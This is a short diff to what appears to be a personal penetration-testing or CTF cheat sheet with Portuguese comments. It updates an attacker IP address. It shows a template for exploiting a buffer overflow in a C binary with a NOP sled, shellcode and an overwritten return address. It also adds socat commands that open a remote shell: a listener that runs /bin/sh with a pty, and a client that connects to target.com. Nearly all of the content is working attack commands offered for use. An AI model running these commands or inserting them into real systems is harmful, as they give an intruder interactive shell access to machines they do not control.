@@ -1,4 +1,4 @@
-my ip = 10.13.5.195
+my ip = 10.2.29.121
 ip machine = 10.10.120.119
 
 
@@ -211,6 +211,11 @@ i r  #verificar endereço sobreescrito
 x/xg $<registrador> #verificar o valor dentro do registrador
 
 (python -c "print('\x90'*(fill in the number) + (shellcode) + 'A'*(fill in the number) +(return address))";cat) | ./<binário>   #explorar o buffer overflow no binário em c
+
+socat FILE:`tty`,raw,echo=0 TCP:target.com:12345
+#no pc do atacante
+LPORT=12345
+socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane   #bind shell com socat
 
 
 
